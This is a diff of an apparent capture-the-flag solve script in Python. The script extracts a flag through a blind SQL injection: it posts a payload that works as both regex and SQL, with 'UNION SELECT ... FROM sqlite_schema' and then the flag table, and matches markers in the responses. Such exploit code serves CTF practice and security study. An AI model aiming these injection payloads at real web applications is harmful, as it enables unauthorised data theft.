@@ -15,11 +15,11 @@ while pos < 17:
         # this works as a sql injection since the ?*( and )* stuff are in quotes/comments and it works as a regex since
         # the UNION SELECT stuff is in a capturing group with * so it doesn't need to exist
         r = requests.post(url, data={"ptrn": "?*(' UNION SELECT name AS word FROM sqlite_schema --)*", "word": flagTable})
-        if "that was weird" in r.text:
+        if "HUHH WHAT" in r.text:
             print(flagTable)
             pos = 17
             break
-        newPos = int(re.findall("check char ([0-9]+)</h3>",r.text)[0])
+        newPos = int(re.findall("CHAR ([0-9]+)</h3>",r.text)[0])
         if pos != newPos:
             pos = newPos
             print(pos, flagTable)
@@ -32,10 +32,10 @@ while True:
     for c in bank2:
         flag = flag[:pos] + c + flag[pos+1:]
         r = requests.post(url, data={"ptrn": f"?*(' UNION SELECT flag AS word FROM {flagTable} --)*", "word": flag})
-        if "that was weird" in r.text:
+        if "HUHH WHAT" in r.text:
             print(flag)
             break
-        newPos = int(re.findall("check char ([0-9]+)</h3>",r.text)[0])
+        newPos = int(re.findall("CHAR ([0-9]+)</h3>",r.text)[0])
         if pos != newPos:
             pos = newPos
             print(pos, flag)
